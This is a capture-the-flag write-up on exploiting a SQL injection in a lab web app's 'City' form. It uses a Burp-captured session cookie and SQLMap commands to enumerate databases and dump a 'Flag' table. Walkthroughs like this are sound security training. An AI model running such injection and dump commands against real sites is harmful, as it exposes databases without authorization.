# Solution

When logging in as user=anonymous, we can tell that the unusual text-form that appears can be tested for vulnerability. Since this text-form is a unique case for user=anonymous, we need to get the cookie for this scenario.

Retrieving the cookie can be done by using **burpSuite** and intercepting the web server when logging in as anonymous. We are then left with the cookie:

```
Cookie: PHPSESSID=4h84k6rantkj5olieg85ui31q5
```

This cookie can be used with **SQLMap** to test vulnerability of specific forms, which hopefully will prompt us the tables of the web server.

````
sqlmap -u "http://r2d2.hackingarena.com:1819/index.php" --cookie="PHPSESSID=4h84k6rantkj5olieg85ui31q5" --forms --dbs
````

We were then asked which form we wanted to test and we chose the form for city. The unique text form which appeared by logging in as anonymous

Furthermore, we allowed SQLMap to test the field with random values, which prompted us a message telling us that post parameter 'City' was injectable. Finally, we allowed SQLMap to exploit the SQL injection.

The bottom four databases are known to be default in a system. Therefor, we proceed with the database "BeatlesData".

We now attempt to extract tables from database "BeatlesData", and yet again select the exploitable form "city".

```
sqlmap -u "http://r2d2.hackingarena.com:1819/index.php" --cookie="PHPSESSID=4h84k6rantkj5olieg85ui31q5" --forms -D BeatlesData --tables
```

Lastly, we extract the data from database "BeatlesData" and table "Flag" to be dumped in our CLI.

```
sqlmap -u "http://r2d2.hackingarena.com:1819/index.php" --cookie="PHPSESSID=4h84k6rantkj5olieg85ui31q5" --forms -D BeatlesData -T Flag --dump
```
